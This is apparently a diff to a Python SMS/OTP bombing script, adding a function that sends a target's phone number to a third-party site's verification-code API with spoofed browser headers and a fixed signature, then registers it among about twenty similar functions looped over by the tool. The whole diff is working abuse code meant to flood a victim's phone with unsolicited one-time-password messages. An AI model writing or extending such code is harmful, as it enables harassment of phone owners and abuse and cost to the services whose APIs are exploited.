@@ -724,6 +724,36 @@ def otp18(number):
         if debugError == True:
             print(f"\033[1;91mError otp18 {e}\033[1;92m")
         return False
+
+def otp19(number):
+    global LIMIT, ERROR
+    number = to9(number=number)
+    session = requests.Session()
+    url = "https://admin.skc-app.ru/rest/api/customers/sendVerifyCodeV2"
+    header = {'Host': 'admin.skc-app.ru', 'Connection': 'keep-alive', 'Content-Length': '92', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.9', 'Origin': 'https://m.skc-invest.com', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://m.skc-invest.com/', 'Accept-Encoding': 'gzip, deflate, br'}
+    body = {"account":str(number),"passwordType":"REGISTER","sign":"107ab28653558980b70627654162306c"}
+
+    try:
+        web = session.post(url, headers=header, json=body, timeout=8)
+        result = json.loads(web.text)
+        if debug == True:
+            print(f"{web.status_code} from skc")
+        if result['success'] == True:
+            LIMIT += 1
+            # try:
+            #     sleep = result['value']['expiredMinutes']*60
+            #     time.sleep(sleep)
+            # except:
+            #     pass
+            return True
+        else:
+            ERROR += 1
+            return False
+    except Exception as e:
+        ERROR += 1
+        if debugError == True:
+            print(f"\033[1;91mError otp19 {e}\033[1;92m")
+        return False
 # you can add api and put it in the box to run
 
 # mainporcesore
@@ -770,7 +800,8 @@ def home():
     function = [otp, otp1, otp2, otp3, otp4,
                 otp5, otp6, otp7, otp8, otp9,
                 otp11, otp12, otp13, otp14,
-                otp15, otp16, otp17, otp18
+                otp15, otp16, otp17, otp18,
+                otp19
                 ]
     # append LIMIT in global variables
     LIMIT1 = pick()
